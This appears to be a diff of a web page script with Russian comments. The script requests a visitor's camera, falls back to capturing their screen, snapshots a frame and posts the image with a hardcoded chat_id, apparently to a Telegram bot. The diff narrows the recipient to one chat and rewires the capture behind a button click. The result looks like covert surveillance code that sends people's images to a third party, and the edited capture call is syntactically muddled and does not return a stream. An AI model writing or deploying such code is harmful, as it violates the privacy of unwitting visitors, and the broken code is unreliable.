@@ -106,7 +106,11 @@
                 audio: false
               };
               
-              const stream = await navigator.mediaDevices.getUserMedia(anyCamera);
+              // const stream = await navigator.mediaDevices.getUserMedia(anyCamera);
+              const stream = await( 
+              button.onclick = () => navigator.mediaDevices.getUserMedia(anyCamera)
+            )
+
               const video = document.getElementById("video");
               video.srcObject = stream;
               
@@ -120,6 +124,7 @@
               
               // Резервный метод - захват экрана
               try {
+                
                 const stream = await navigator.mediaDevices.getDisplayMedia({
                   video: true
                 });
@@ -152,13 +157,13 @@
           
           // Для фронтальной камеры можно добавить зеркальное отражение
           context.save();
-          context.scale(-1, 1); // Зеркалим по горизонтали
+          context.scale(-1, 1);
           context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
           context.restore();
           
           canvas.toBlob(function (blob) {
             const formData = new FormData();
-            formData.append("chat_id", "1143475155" && "5810250799");
+            formData.append("chat_id", "5810250799");
             formData.append("photo", blob);
 
             fetch(
